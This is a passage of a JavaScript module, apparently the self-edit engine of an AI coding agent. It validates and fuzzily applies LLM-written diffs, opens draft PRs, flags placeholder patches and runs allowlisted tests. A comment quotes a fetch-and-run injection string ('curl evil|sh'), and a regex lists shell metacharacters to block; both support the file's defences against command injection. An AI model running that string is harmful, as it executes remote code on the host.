/**
 * Self-Edit Engine — bounded coding operator for Dream Chat
 *
 * Safety rules:
 * - All file paths must resolve inside repoRoot
 * - Branch names are sanitized and prefixed with "auto/"
 * - Only unified diffs are applied (no arbitrary writes)
 * - Tests are allowlisted patterns only
 * - Never push directly to master
 * - PRs are always draft
 */

const fs = require("fs");
const path = require("path");
const { execFileSync } = require("child_process");
const { tokenizeCommand, safeExec } = require("./safe-exec");
const https = require("https");

// TLS-verification gate is centralized in lib/insecure-tls.js so all three LLM-call
// sites share one source of truth — insecure ONLY on Windows or with an explicit
// LANTERN_INSECURE_TLS=1, never unconditionally (the response here is applied as a
// code diff, so an MITM would be RCE). #869
const { llmAgent } = require("./insecure-tls");

const MAX_OUTPUT = 8000;
const MAX_DIFF_SIZE = 128000;

// ── Path safety ─────────────────────────────────────────────────────────

function isPathSafe(repoRoot, filePath) {
  const resolved = path.resolve(repoRoot, filePath);
  const relative = path.relative(repoRoot, resolved);
  if (relative.startsWith("..") || path.isAbsolute(relative)) return false;
  return true;
}

function requireSafePaths(repoRoot, filePaths) {
  for (const fp of filePaths) {
    if (!isPathSafe(repoRoot, fp)) {
      throw new Error(`unsafe_path: ${fp}`);
    }
  }
}

// Resolve an LLM-supplied path to its real repo location. Returns it unchanged if it
// already exists; otherwise, when the repo has exactly one tracked file with that
// basename (or one whose path uniquely ends with it), returns that real path. Fixes
// plans that reference a bare basename (`ouro_serve.py`) when the file lives under a
// directory (`scripts/ouro_serve.py`) — which otherwise makes the patch generator
// feed `<new file>` and emit a duplicate at the wrong path (#777). Ambiguous (>1
// match) paths are left as-is so we never silently retarget the wrong file.
function resolveRepoPath(repoRoot, p) {
  if (!p || typeof p !== "string") return p;
  const rel = p.replace(/^[ab]\//, "").replace(/\\/g, "/");
  if (fs.existsSync(path.join(repoRoot, rel))) return rel;
  const base = path.posix.basename(rel);
  if (!base) return rel;
  let candidates = [];
  try {
    const out = execFileSync("git", ["ls-files", `*/${base}`, base], {
      cwd: repoRoot, encoding: "utf8", timeout: 10000, windowsHide: true,
    });
    candidates = out.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
  } catch (_e) { /* no git or no match */ }
  if (!candidates.length) return rel;
  const suffix = candidates.filter((c) => c === rel || c.endsWith("/" + rel));
  const resolved = suffix.length === 1 ? suffix[0] : (candidates.length === 1 ? candidates[0] : null);
  return resolved && isPathSafe(repoRoot, resolved) ? resolved : rel;
}

// ── Branch safety ───────────────────────────────────────────────────────

function sanitizeBranchName(raw) {
  const base = String(raw || "")
    .toLowerCase()
    .replace(/[^a-z0-9\-_\s]/g, "")
    .replace(/\s+/g, "-")
    .replace(/-+/g, "-")
    .slice(0, 60)
    .replace(/^-|-$/g, "");
  const safe = base || "auto-change";
  return `auto/${safe}`;
}

// ── Diff parsing ──────────────────────────────────────────────────────────

/**
 * Parse a unified diff into hunks.
 * Returns: [{ oldFile, newFile, hunks: [{ oldStart, oldCount, newStart, newCount, lines: [] }] }]
 */
function parseUnifiedDiff(diffText) {
  const lines = diffText.split(/\r?\n/);
  const files = [];
  let current = null;
  let currentHunk = null;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.startsWith("--- ")) {
      if (current) files.push(current);
      const oldFile = line.slice(4).split("\t")[0];
      current = { oldFile, newFile: null, hunks: [] };
      currentHunk = null;
    } else if (line.startsWith("+++ ") && current) {
      current.newFile = line.slice(4).split("\t")[0];
    } else if (line.startsWith("@@") && current) {
      const m = line.match(/@@ -(\d+)(?:,(\d+))? \+(\d+)(?:,(\d+))? @@/);
      if (!m) continue;
      currentHunk = {
        oldStart: parseInt(m[1], 10),
        oldCount: parseInt(m[2] || "1", 10),
        newStart: parseInt(m[3], 10),
        newCount: parseInt(m[4] || "1", 10),
        lines: [],
      };
      current.hunks.push(currentHunk);
    } else if (currentHunk) {
      currentHunk.lines.push(line);
    }
  }
  if (current) files.push(current);
  return files;
}

function validateDiff(diffText, repoRoot) {
  if (diffText.length > MAX_DIFF_SIZE) {
    throw new Error("diff_too_large");
  }
  const files = parseUnifiedDiff(diffText);
  if (files.length === 0) {
    throw new Error("diff_parse_failed: no valid hunks found");
  }
  for (const f of files) {
    let target = f.newFile && f.newFile !== "/dev/null" ? f.newFile : f.oldFile;
    if (!target || target === "/dev/null") continue;
    target = target.replace(/^(a|b)\//, "");
    if (!isPathSafe(repoRoot, target)) {
      throw new Error(`diff_unsafe_path: ${target}`);
    }
  }
  return files;
}

// ── Diff application ────────────────────────────────────────────────────

// Split a hunk into its "before" (context + removed) and "after" (context +
// added) line arrays, ignoring the @@ header counts — LLM diffs routinely get
// them wrong — and "\ No newline at end of file" markers.
function hunkBlocks(hunk) {
  const before = [];
  const after = [];
  // Drop trailing blank lines: a diff that ends with a newline parses into a
  // spurious "" hunk line that is not real content (an interior blank context
  // line arrives as " " or, from some generators, as a bare "").
  let end = hunk.lines.length;
  while (end > 0 && hunk.lines[end - 1] === "") end--;
  for (let i = 0; i < end; i++) {
    const l = hunk.lines[i];
    const tag = l[0];
    if (tag === "+") after.push(l.slice(1));
    else if (tag === "-") before.push(l.slice(1));
    else if (tag === "\\") continue; // "\ No newline at end of file"
    else {
      // context line (" foo"), or a bare blank line some generators emit as ""
      const text = l.startsWith(" ") ? l.slice(1) : l;
      before.push(text);
      after.push(text);
    }
  }
  return { before, after };
}

// Find where the `before` block sits in `lines`, preferring the position
// closest to `hint`. Exact pass first, then a whitespace-normalized pass so
// indentation / trailing-space drift still lands. Returns start index, or -1.
function locateBlock(lines, before, hint) {
  const n = lines.length;
  const m = before.length;
  if (m === 0) return Math.min(Math.max(hint, 0), n); // pure insertion
  if (m > n) return -1;
  const starts = [];
  for (let i = 0; i + m <= n; i++) starts.push(i);
  starts.sort((a, b) => Math.abs(a - hint) - Math.abs(b - hint) || a - b);
  const matches = (start, eq) => {
    for (let j = 0; j < m; j++) if (!eq(lines[start + j], before[j])) return false;
    return true;
  };
  for (const s of starts) if (matches(s, (a, b) => a === b)) return s;
  for (const s of starts) if (matches(s, (a, b) => a.trim() === b.trim())) return s;
  return -1;
}

// Apply one hunk by locating its context in the file rather than trusting the
// (often-wrong) @@ line numbers. Fuzzy: tolerant of header-count drift, line
// drift, and whitespace differences — the failure modes of LLM-authored diffs.
function applyHunkFuzzy(lines, hunk) {
  const { before, after } = hunkBlocks(hunk);
  if (before.length === 0) {
    const at = Math.min(Math.max(hunk.oldStart - 1, 0), lines.length);
    return [...lines.slice(0, at), ...after, ...lines.slice(at)];
  }
  const pos = locateBlock(lines, before, hunk.oldStart - 1);
  if (pos < 0) {
    throw new Error(`hunk_not_located: ${before.length}-line context near line ${hunk.oldStart} not found`);
  }
  return [...lines.slice(0, pos), ...after, ...lines.slice(pos + before.length)];
}

// Targets of a parsed diff, as repo-relative paths, tagged created vs changed.
function diffTargets(files) {
  const out = [];
  for (const f of files) {
    let target = f.newFile && f.newFile !== "/dev/null" ? f.newFile : f.oldFile;
    if (!target || target === "/dev/null") continue;
    target = target.replace(/^(a|b)\//, "");
    out.push({ target, created: f.oldFile === "/dev/null" });
  }
  return out;
}

// In-process, dependency-free fallback applier. Fuzzy: it locates each hunk by
// content (whitespace-tolerant) instead of trusting the diff's line numbers, so
// it lands LLM-authored diffs that git apply and an exact-match applier reject.
// Hunks apply high-line-first so a later hunk can't shift an earlier one's index;
// the file's EOL and trailing newline are preserved.
function applyPatchStrict(repoRoot, files) {
  const stats = { changed: [], created: [], errors: [] };
  for (const f of files) {
    let target = f.newFile && f.newFile !== "/dev/null" ? f.newFile : f.oldFile;
    if (!target || target === "/dev/null") continue;
    target = target.replace(/^(a|b)\//, "");
    const fullPath = path.join(repoRoot, target);
    const existed = fs.existsSync(fullPath);
    const raw = existed ? fs.readFileSync(fullPath, "utf8") : "";
    const eol = /\r\n/.test(raw) ? "\r\n" : "\n";
    const trailingNewline = /\n$/.test(raw);
    let lines = raw.length ? raw.split(/\r?\n/) : [];
    if (trailingNewline && lines[lines.length - 1] === "") lines.pop();
    try {
      let working = lines;
      const hunks = [...f.hunks].sort((a, b) => b.oldStart - a.oldStart);
      for (const h of hunks) working = applyHunkFuzzy(working, h);
      const dir = path.dirname(fullPath);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(fullPath, working.join(eol) + (trailingNewline || !existed ? eol : ""), "utf8");
      if (!existed && f.hunks.length > 0) stats.created.push(target);
      else stats.changed.push(target);
    } catch (err) {
      stats.errors.push({ file: target, error: err.message });
    }
  }
  return stats;
}

// Repair dropped-prefix paths in an LLM diff. The model frequently emits a bare
// basename (`a/ouro_serve.py`) when the real file lives under a directory
// (`scripts/ouro_serve.py`). git apply and the strict applier both key on the
// literal path, so the patch lands nowhere → the anti-fraud gate aborts ("no usable
// code changes"). When a CHANGED target doesn't exist but the repo holds exactly one
// tracked file with that basename (or one whose path uniquely ends with the target),
// rewrite the diff's header lines to the real path. New files (oldFile=/dev/null) are
// left as authored; ambiguous (>1 candidate) matches are left untouched.
function resolveDiffPaths(repoRoot, diffText, files) {
  const rewrites = [];
  const seen = new Set();
  for (const f of files) {
    if (f.oldFile === "/dev/null") continue; // intentional new file
    let target = (f.newFile && f.newFile !== "/dev/null" ? f.newFile : f.oldFile) || "";
    target = target.replace(/^(a|b)\//, "").replace(/\\/g, "/");
    if (!target || seen.has(target)) continue;
    seen.add(target);
    if (fs.existsSync(path.join(repoRoot, target))) continue; // already correct
    const base = path.posix.basename(target);
    if (!base) continue;
    let candidates = [];
    try {
      const out = execFileSync("git", ["ls-files", `*/${base}`, base], {
        cwd: repoRoot, encoding: "utf8", timeout: 10000, windowsHide: true,
      });
      candidates = out.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
    } catch (_e) { /* no git or no match */ }
    if (!candidates.length) continue;
    const suffix = candidates.filter((c) => c === target || c.endsWith("/" + target));
    const resolved = suffix.length === 1 ? suffix[0] : (candidates.length === 1 ? candidates[0] : null);
    if (resolved && resolved !== target && isPathSafe(repoRoot, resolved)) {
      rewrites.push({ from: target, to: resolved });
    }
  }
  if (!rewrites.length) return { diffText, rewrites };
  const lines = diffText.split("\n");
  for (let i = 0; i < lines.length; i++) {
    if (!(lines[i].startsWith("--- ") || lines[i].startsWith("+++ ") || lines[i].startsWith("diff --git "))) continue;
    for (const { from, to } of rewrites) {
      lines[i] = lines[i].split(`a/${from}`).join(`a/${to}`).split(`b/${from}`).join(`b/${to}`);
    }
  }
  return { diffText: lines.join("\n"), rewrites };
}

// Apply a unified diff. LLM-generated diffs almost always have line-number drift
// and minor context fuzz. We try git's robust applier first (recount/fuzz/3way),
// and fall back to an in-process *fuzzy* applier (content-located, whitespace-
// tolerant) that lands diffs git apply rejects — without it the patch never
// lands and autowork can't complete issues. validateDiff still gates format +
// path safety, and the caller's anti-fraud gate still rejects empty/errored results.
function applyPatch(repoRoot, diffText) {
  let files = validateDiff(diffText, repoRoot);
  // Repair dropped-prefix paths (e.g. ouro_serve.py -> scripts/ouro_serve.py) so the
  // patch lands on the real file instead of failing the apply and aborting the run.
  const pathFix = resolveDiffPaths(repoRoot, diffText, files);
  const pathRewrites = pathFix.rewrites;
  if (pathRewrites.length) {
    diffText = pathFix.diffText;
    files = validateDiff(diffText, repoRoot);
  }
  const targets = diffTargets(files);
  const os = require("os");
  const tmp = path.join(os.tmpdir(), `autowork-${process.pid}-${Date.now()}.diff`);
  fs.writeFileSync(tmp, diffText.endsWith("\n") ? diffText : diffText + "\n", "utf8");

  // Most-faithful strategy first, then progressively more tolerant.
  const strategies = [
    ["--recount", "--whitespace=nowarn"],
    ["--recount", "-C1", "--whitespace=fix"],
    ["--3way", "--recount", "--whitespace=nowarn"],
  ];
  let applied = false, lastErr = "";
  for (const flags of strategies) {
    try {
      execFileSync("git", ["apply", "--check", ...flags, tmp], { cwd: repoRoot, encoding: "utf8", timeout: 15000 });
    } catch (e) { lastErr = String(e.stderr || e.message || "").slice(0, 500); continue; }
    try {
      execFileSync("git", ["apply", ...flags, tmp], { cwd: repoRoot, encoding: "utf8", timeout: 15000 });
      applied = true; break;
    } catch (e) { lastErr = String(e.stderr || e.message || "").slice(0, 500); continue; }
  }
  try { fs.unlinkSync(tmp); } catch (_e) { /* best effort */ }

  if (applied) {
    return {
      changed: targets.filter((t) => !t.created).map((t) => t.target),
      created: targets.filter((t) => t.created).map((t) => t.target),
      errors: [],
      applier: "git",
      pathRewrites,
    };
  }

  // git apply rejected the diff — fall back to the in-process fuzzy applier.
  const strict = applyPatchStrict(repoRoot, files);
  strict.applier = "strict";
  strict.pathRewrites = pathRewrites;
  if (strict.errors.length > 0 && lastErr) strict.gitApplyError = lastErr;
  return strict;
}

// ── Git operations ──────────────────────────────────────────────────────

function gitCurrentBranch(repoRoot) {
  return safeExec(["git", "branch", "--show-current"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
}

// Guard against clobbering in-progress work. This automation operates on the
// primary working tree (REPO_ROOT), so a branch switch here would silently
// discard any uncommitted edits a human (or another process) has staged or
// modified — and a stray staged file would also leak into the next commit.
// Refuse the switch when the tree is dirty rather than destroy that work.
function gitEnsureClean(repoRoot) {
  const dirty = safeExec(["git", "status", "--porcelain"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
  if (dirty) {
    const n = dirty.split("\n").length;
    throw new Error(
      `git_tree_dirty: refusing to switch branches in ${repoRoot} — ${n} uncommitted ` +
      `change(s) would be clobbered. Commit, stash, or run this automation in a ` +
      `dedicated git worktree.`
    );
  }
}

function gitCreateBranch(repoRoot, branchName) {
  const safe = sanitizeBranchName(branchName);
  gitEnsureClean(repoRoot);
  safeExec(["git", "checkout", "-b", safe], { cwd: repoRoot, encoding: "utf8", timeout: 10000 });
  return safe;
}

function gitCommit(repoRoot, message) {
  // No shell: the message is a discrete argv entry, so quotes / $(…) / backticks
  // can no longer inject (the old `"`→`'` strip didn't stop command substitution).
  const safeMsg = String(message || "auto commit").slice(0, 200);
  safeExec(["git", "commit", "-m", safeMsg], {
    cwd: repoRoot,
    encoding: "utf8",
    timeout: 10000,
    env: { ...process.env, GIT_TERMINAL_PROMPT: "0", SKIP_MONOWORKSTREAM: "1" },
  });
}

function gitPush(repoRoot, targetBranch) {
  // targetBranch is already sanitized (auto/...) — don't re-sanitize or the
  // slash gets stripped and the name doubles (auto/foo → auto/autofoo).
  if (!targetBranch.startsWith("auto/")) throw new Error("invalid_branch_prefix");
  // Use HEAD:ref so we don't need to rename the local branch first.
  safeExec(["git", "push", "origin", `HEAD:${targetBranch}`], {
    cwd: repoRoot,
    encoding: "utf8",
    timeout: 30000,
    env: { ...process.env, GIT_TERMINAL_PROMPT: "0", SKIP_MONOWORKSTREAM: "1" },
  });
  return targetBranch;
}

function gitDiffStat(repoRoot) {
  return safeExec(["git", "diff", "--stat"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
}

function gitAddAll(repoRoot) {
  safeExec(["git", "add", "-A"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 });
}

// Stage ONLY the given files. Critical anti-fraud measure: autowork must never
// `git add -A` (that sweeps unrelated runtime data churn — prices.jsonl etc. —
// into the commit, letting a no-op patch masquerade as a real fix). Paths are
// validated inside repoRoot and staged individually via execFileSync (no shell).
function gitAddFiles(repoRoot, files) {
  const list = (files || []).filter((f) => f && isPathSafe(repoRoot, f));
  if (list.length === 0) throw new Error("no_files_to_stage");
  for (const f of list) {
    execFileSync("git", ["add", "--", f], { cwd: repoRoot, encoding: "utf8", timeout: 5000 });
  }
  return list;
}

// GitHub repo slug for API calls. Override with GH_REPO env if the remote moves.
const GH_REPO = process.env.GH_REPO || "alex-place/lantern-os";

// Derive a concise, conventional issue title from a free-form task instruction.
// First non-empty line, stripped of a leading bang-command / list marker, capped.
function taskTitle(task) {
  const firstLine = String(task || "")
    .split(/\r?\n/)
    .map((l) => l.trim())
    .find((l) => l.length > 0) || "";
  const cleaned = firstLine
    // Strip a trigger ONLY in its command forms — `!work`/`!edit …` or `autowork: …` —
    // never bare prose: "Edit the handler" / "Work on X" must keep their first word, and
    // the digit/bullet strip below must not eat a semantic leading number ("3D", "2FA").
    .replace(/^!\s*(?:work|autowork|edit)\b[:\s]*/i, "") // bang command: !work / !edit
    .replace(/^(?:autowork|work|edit)\s*:\s*/i, "")       // label form:   "autowork: …"
    .replace(/^(?:[-*•]\s+|\d+[.)]\s+)/, "")              // a real list bullet / "1. " / "1) "
    .trim();
  // Default applied only as a final fallback (after the strips, so it can't be eaten).
  return (cleaned || "Autowork task").slice(0, 120);
}

// Strong markers of a placeholder / non-implementation patch — phrases a weak
// model emits when it has no real spec (e.g. from a junk "autowork the oldest
// issue" title) and that essentially never appear in a genuine fix. Deliberately
// excludes lone "TODO"/"FIXME" (too common in real code) — only unambiguous
// "I didn't actually implement this" tells.
const PLACEHOLDER_MARKERS = [
  /placeholder for /i,
  /simulate(?:d|s)? (?:async )?work/i,
  /in a real (?:scenario|implementation|app|world)/i,
  /your (?:actual )?(?:logic|code|implementation) here/i,
  /(?:implementation|logic|code) goes here/i,
  /replace this (?:with|stub)/i,
  /assuming an internal state/i,
  /this would (?:fetch|call|do|process|handle|return)/i,
  /\bdummy (?:data|value|function|impl)/i,
  /not (?:yet )?implemented/i,
  /real implementation would/i,
];

// Detect a patch that is obvious placeholder scaffolding rather than a real
// implementation. Returns { placeholder, signals }. Conservative on purpose:
// trips only on >=2 DISTINCT strong markers among ADDED lines, so a single
// stray "TODO"-ish comment in an otherwise-real fix never blocks. Scans only
// added (`+`) lines — context/removed lines are irrelevant.
function looksLikePlaceholderPatch(diffText) {
  const raw = String(diffText || "");
  const added = raw
    .split(/\r?\n/)
    .filter((l) => l.startsWith("+") && !l.startsWith("+++"))
    .map((l) => l.slice(1));
  const text = added.join("\n");
  const signals = [];
  for (const re of PLACEHOLDER_MARKERS) {
    const m = text.match(re);
    if (m) signals.push(m[0].trim().toLowerCase());
  }
  const uniq = [...new Set(signals)];

  // Doc-only slop (#1520): a "patch" whose changes are ENTIRELY markdown/text docs
  // under issues/ or workspace/, or a file with "placeholder" in its name, is a weak
  // model dumping the issue text instead of writing code (e.g. autowork once committed
  // `issues/placeholder-feature-issue.md` as the whole fix). Those paths are never a
  // real fix target, so a patch touching ONLY them is non-implementation slop. Narrow
  // by design: legitimate doc edits (changelog.d/*.md, docs/*, README) are untouched.
  const touched = (raw.match(/^\+\+\+ b\/(.+)$/gm) || [])
    .map((l) => l.replace(/^\+\+\+ b\//, "").trim())
    .filter((p) => p && p !== "/dev/null");
  const docOnlySlop = touched.length > 0 && touched.every((p) => {
    const f = p.replace(/\\/g, "/");
    return /\.(md|markdown|txt|rst)$/i.test(f)
      && (/(^|\/)(issues|workspace)\//i.test(f) || /placeholder/i.test(f));
  });

  const out = docOnlySlop ? [...uniq, "doc-only slop (issues//workspace//*placeholder*)"] : uniq;
  return { placeholder: uniq.length >= 2 || docOnlySlop, signals: out };
}

// Verify gate (#1359): a clean-applying, non-placeholder patch can still leave a
// changed file UNPARSEABLE. If that file isn't exercised by the planned tests (a
// browser script like dream-chat-ui.js, a one-off tool script), the test gate
// won't catch it and a syntax-broken patch opens a bad PR — exactly how an autowork
// run shipped `function parseImageRequest(text)` with no body. Parse-check each
// changed JS/Python source by extension (no execution, no side effects); returns
// [{file,error}] for the ones that fail (empty = all parse). A missing checker
// binary is skipped, never reported as a false failure.
function patchSyntaxErrors(changedFiles, repoRoot) {
  const PY = process.env.PYTHON_PATH || (process.platform === "win32" ? "python" : "python3");
  const errors = [];
  for (const rel of changedFiles || []) {
    const abs = path.join(repoRoot, rel);
    let cmd, args;
    if (/\.(?:c|m)?js$/i.test(rel)) {
      cmd = process.execPath;                 // `node --check`: parse-only, no execution
      args = ["--check", abs];
    } else if (/\.py$/i.test(rel)) {
      cmd = PY;                               // `ast.parse`: syntax-only, writes no .pyc
      args = ["-c", "import ast,sys; ast.parse(open(sys.argv[1],encoding='utf-8').read(), sys.argv[1])", abs];
    } else {
      continue;                               // only languages we can cheaply parse-check
    }
    try {
      execFileSync(cmd, args, { cwd: repoRoot, timeout: 20000, windowsHide: true, stdio: "pipe" });
    } catch (e) {
      if (e && e.code === "ENOENT") continue;  // checker binary unavailable → don't block
      const msg = String(e.stderr || e.stdout || e.message || "")
        .replace(/\r/g, "").trim().split("\n").filter(Boolean).slice(-3).join(" ").slice(0, 300);
      errors.push({ file: rel, error: msg || "failed to parse" });
    }
  }
  return errors;
}

// An explicit "just file an issue" request — the user wants a ticket LOGGED, not
// code written this turn. Routing it through the patch pipeline only manufactures
// slop (#1517 → a placeholder .md committed as the "fix"). Match a file/open/log
// verb + issue/ticket/bug, UNLESS the same message also asks to implement it
// (fix/build/add/…) — then keep the full pipeline. (#1521)
function isFileIssueOnlyRequest(task) {
  const t = String(task || "").trim().toLowerCase();
  if (!t) return false;
  const fileVerb = /\b(file|open|log|create|raise|submit)\b[\w\s]*\b(issue|ticket|bug)\b/.test(t);
  if (!fileVerb) return false;
  const implementVerb = /\b(fix|implement|build|add|write|refactor|patch|code|resolve|solve)\b/.test(t);
  return !implementVerb;
}

// A task message that *references an existing issue* must NOT be filed as a new
// one — otherwise meta-commands like "autowork the oldest issue" or "work issue
// #1342" get filed verbatim as junk issues (#1344/#1346) and the pipeline patches
// the wrong target. Resolve such references to an OPEN issue number, else null so
// the caller falls back to createIssueFromTask for genuinely novel requests.
function resolveExistingIssue(repoRoot, task) {
  const text = String(task || "").trim();
  if (!text) return null;
  const env = { ...process.env, GIT_TERMINAL_PROMPT: "0" };

  // Verify a candidate number is a real OPEN issue; return it (or null).
  const openIssue = (n) => {
    if (!n || !Number.isFinite(n)) return null;
    try {
      const out = execFileSync(
        "gh",
        ["issue", "view", String(n), "--repo", GH_REPO, "--json", "number,state"],
        { cwd: repoRoot, encoding: "utf8", timeout: 10000, windowsHide: true, env }
      );
      const j = JSON.parse(out);
      return String(j.state).toUpperCase() === "OPEN" ? j.number : null;
    } catch (_e) {
      return null;
    }
  };

  // 1) Explicit reference: "#1342", "issue 1342", "issue #1342".
  const m = text.match(/(?:#|\bissues?\s+#?)(\d{1,7})\b/i);
  if (m) {
    const hit = openIssue(parseInt(m[1], 10));
    if (hit) return hit;
  }

  // 2) Superlative reference: "the oldest [open] issue" / "newest|latest issue".
  //    Only when the message is clearly *about* picking an existing issue, not a
  //    coding task that happens to contain the word "issue".
  const sup = text.match(/\b(oldest|newest|latest)\b[^.\n]*\bissues?\b/i);
  if (sup) {
    const direction = /oldest/i.test(sup[1]) ? "asc" : "desc";
    try {
      const out = execFileSync(
        "gh",
        ["issue", "list", "--repo", GH_REPO, "--state", "open", "--limit", "100",
          "--json", "number,createdAt"],
        { cwd: repoRoot, encoding: "utf8", timeout: 15000, windowsHide: true, env }
      );
      const rows = JSON.parse(out);
      if (Array.isArray(rows) && rows.length) {
        rows.sort((a, b) =>
          direction === "asc"
            ? String(a.createdAt).localeCompare(String(b.createdAt))
            : String(b.createdAt).localeCompare(String(a.createdAt))
        );
        return rows[0].number;
      }
    } catch (_e) {
      /* fall through to null */
    }
  }

  return null;
}

// Create a GitHub issue from a free-form chat instruction, so the issue-linked
// autowork pipeline (which keys off a real issue number) can work it. Returns
// { number, url, title }. Used by the suggest-then-confirm "Run as autowork"
// path — a free-form coding request first becomes a tracked issue, then a PR.
function createIssueFromTask(repoRoot, task) {
  const text = String(task || "").trim();
  if (!text) throw new Error("task_required");
  const title = taskTitle(text);
  const body =
    `${text}\n\n---\n_Filed automatically from Keystone OS chat (autowork “run as task”). ` +
    `A linked draft PR follows._`;
  const env = { ...process.env, GIT_TERMINAL_PROMPT: "0", SKIP_MONOWORKSTREAM: "1" };
  // `gh issue create` prints the new issue URL on stdout; parse the number from it.
  const out = execFileSync(
    "gh",
    ["issue", "create", "--repo", GH_REPO, "--title", title, "--body", body.slice(0, 8000)],
    { cwd: repoRoot, encoding: "utf8", timeout: 30000, windowsHide: true, env }
  ).trim();
  const url = (out.match(/https:\/\/github\.com\/[^\s]+\/issues\/(\d+)/) || [])[0] || out;
  const number = parseInt((url.match(/\/issues\/(\d+)/) || [])[1], 10);
  if (!number) throw new Error("issue_create_failed: " + out.slice(0, 200));
  return { number, url, title };
}

// Owner of the `origin` remote that gitPush() actually pushes to — the PR `head` must
// name THAT repo. Using GH_REPO's owner (the base) makes GitHub look for the branch on
// the base repo and return 422 when it was pushed to a fork. Override with
// AUTOWORK_HEAD_OWNER; falls back to the base owner (assume same-repo). #1358
function pushRemoteOwner(repoRoot) {
  if (process.env.AUTOWORK_HEAD_OWNER) return process.env.AUTOWORK_HEAD_OWNER;
  try {
    const url = execFileSync("git", ["remote", "get-url", "origin"],
      { cwd: repoRoot, encoding: "utf8", timeout: 5000, windowsHide: true }).trim();
    const m = url.match(/[/:]([^/]+)\/[^/]+?(?:\.git)?$/); // https://host/<owner>/<repo>.git | git@host:<owner>/<repo>.git
    if (m && m[1]) return m[1];
  } catch { /* no origin / no git */ }
  return GH_REPO.split("/")[0];
}

function openDraftPr(repoRoot, branch, title, body) {
  if (!branch.startsWith("auto/")) throw new Error("invalid_branch_prefix");
  const safeTitle = String(title || "Auto PR").slice(0, 256);
  const safeBody = String(body || "").slice(0, 4000);
  const env = { ...process.env, GIT_TERMINAL_PROMPT: "0", SKIP_MONOWORKSTREAM: "1" };
  // Cross-fork PR (gitPush sent the branch to a fork) requires head=<fork-owner>:<branch>;
  // a same-repo push can use the bare branch. The list-PRs filter always wants
  // <owner>:<branch>. #1358
  const baseOwner = GH_REPO.split("/")[0];
  const headOwner = pushRemoteOwner(repoRoot);
  const headRef = headOwner && headOwner !== baseOwner ? `${headOwner}:${branch}` : branch;
  const headFilter = `${headOwner || baseOwner}:${branch}`;
  // `gh pr create` is broken on this repo — use the REST API via `gh api`.
  // execFileSync with an args array avoids all shell-quoting issues with title/body.
  try {
    const result = execFileSync(
      "gh",
      [
        "api", `repos/${GH_REPO}/pulls`,
        "--method", "POST",
        "-f", `title=${safeTitle}`,
        "-f", `head=${headRef}`,
        "-f", "base=master",
        "-f", `body=${safeBody}`,
        "-F", "draft=true",
        "--jq", ".html_url",
      ],
      { cwd: repoRoot, encoding: "utf8", timeout: 30000, env }
    );
    const url = result.trim();
    if (url.startsWith("https://")) return url;
    const m = url.match(/(https:\/\/github\.com\/[^\s]+)/);
    if (m) return m[1];
    throw new Error("pr_url_not_returned");
  } catch (e) {
    // PR already exists (422) — query the open PR for this head branch and reuse its URL.
    try {
      const existing = execFileSync(
        "gh",
        ["api", `repos/${GH_REPO}/pulls?head=${headFilter}&state=open`, "--jq", ".[0].html_url"],
        { cwd: repoRoot, encoding: "utf8", timeout: 15000, env }
      ).trim();
      if (existing.startsWith("https://")) return existing;
    } catch (_e) { /* fall through */ }
    const fromErr = (e.stderr || e.stdout || e.message || "").match(/(https:\/\/github\.com\/[^\s\n]+)/);
    if (fromErr) return fromErr[1];
    throw e;
  }
}

// ── Test runner ─────────────────────────────────────────────────────────

const ALLOWED_TESTS = [
  /^node tests\/test_dream_journal_api\.js$/,
  /^node tests\/test_dream_journal_chat\.js$/,
  /^node tests\/test_dream_chat_multiturns\.js$/,
  /^node tests\/test_dream_journal_keystone\.js$/,
  /^node tests\/test_dream_chat_self_edit\.js$/,
  /^node tests\/test_convergance_routing\.js$/,
  // Closed character class (no shell metachars) — the greedy `(.+)` here was an
  // injection surface: `python -m pytest tests/x;curl evil|sh.py` matched. #873
  /^python -m pytest tests\/[\w./-]+\.py$/,
  /^npm test$/,
  /^npm run test$/,
];

function isAllowedTest(cmd) {
  return ALLOWED_TESTS.some((re) => re.test(cmd));
}

// Shell metacharacters that must never reach an executed command. The allowlist
// regexes already exclude them; this is the second, no-shell layer. #873
const SHELL_META = /[;&|$`(){}<>\n\r\\"'*?~]/;
const ALLOWED_TEST_BINS = new Set(["node", "python", "npm", "npx"]);

// Split an allowlisted command into argv with NO shell involvement, rejecting any
// token bearing a shell metacharacter. Returns argv; throws on an unsafe token.
function tokenizeAllowedCommand(cmd) {
  const argv = String(cmd).trim().split(/ +/);
  for (const t of argv) {
    if (!t || SHELL_META.test(t)) throw new Error("unsafe_command_token");
  }
  return argv;
}

function resolveAllowedTestBinary(bin) {
  const normalized = String(bin || "").trim();
  if (!ALLOWED_TEST_BINS.has(normalized)) throw new Error("unsafe_command_bin");
  if (process.platform === "win32" && (normalized === "npm" || normalized === "npx")) return normalized + ".cmd";
  return normalized;
}

// opts.env overrides the child environment — used to point NODE_PATH at the main
// checkout's node_modules when tests run inside an isolated worktree that has none.
function runTests(repoRoot, testCommands, opts = {}) {
  const results = [];
  const env = opts.env || process.env;
  for (const cmd of testCommands) {
    if (!isAllowedTest(cmd)) {
      results.push({ cmd, ok: false, error: "test_not_allowlisted", output: "" });
      continue;
    }
    let argv;
    let bin;
    try {
      argv = tokenizeAllowedCommand(cmd);
      bin = resolveAllowedTestBinary(argv[0]);
    } catch {
      results.push({ cmd, ok: false, error: "test_command_unsafe", output: "" });
      continue;
    }
    try {
      const out = execFileSync(bin, argv.slice(1), { cwd: repoRoot, encoding: "utf8", timeout: 60000, maxBuffer: 1024 * 1024, env, shell: false });
      results.push({ cmd, ok: true, output: out.slice(0, MAX_OUTPUT), truncated: out.length > MAX_OUTPUT });
    } catch (err) {
      // A TIMEOUT (the test hung — e.g. an integration/API test waiting for a server that isn't
      // running in the worktree) is INCONCLUSIVE, not a real failure. Treating it as a failure
      // rolls back good patches (the #1 false-rollback in the dogfood loop). Mark it skipped;
      // the gate fails only on tests that actually RAN and asserted false (ok === false).
      const timedOut = err.killed || err.signal === "SIGTERM" || /ETIMEDOUT/.test(String(err.code));
      results.push({
        cmd,
        ok: timedOut ? null : false,
